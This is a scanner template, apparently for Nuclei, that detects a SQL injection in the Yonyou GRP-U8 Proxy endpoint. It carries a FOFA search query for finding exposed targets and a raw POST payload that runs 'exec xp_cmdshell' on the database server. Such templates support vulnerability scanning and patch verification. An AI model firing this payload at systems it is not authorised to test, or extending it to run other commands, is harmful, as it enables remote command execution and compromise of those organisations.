id: yonyou-grp-u8-proxy-sqli
info:
  name: 用友 GRP U8 Proxy - sqli
  author: leadlife
  severity: critical
  description: 用友 GRP-U8 Proxy SQL注入 CNNVD-201610-923
  reference: 
    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B%20GRP-U8%20Proxy%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923.md
  metadata:
    verified: false
    fofa-query: app="用友-GRP-U8" || title="用友GRP-U8行政事业内控管理软件" || icon_hash="-299520369"
  tags: yonyou,sqli,oa,grpu8

http:
  - raw:
      - |+
        POST /Proxy HTTP/1.1
        Host: {{Hostname}}
        Accept: Accept: */*
        Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host
        Content-Length: 357
        Connection: Keep-Alive
        Cache-Control: no-cache

        cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">exec xp_cmdshell "ver"</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Microsoft Windows"
          - "exec xp_cmdshell"
        condition: or

      - type: status
        status:
          - 200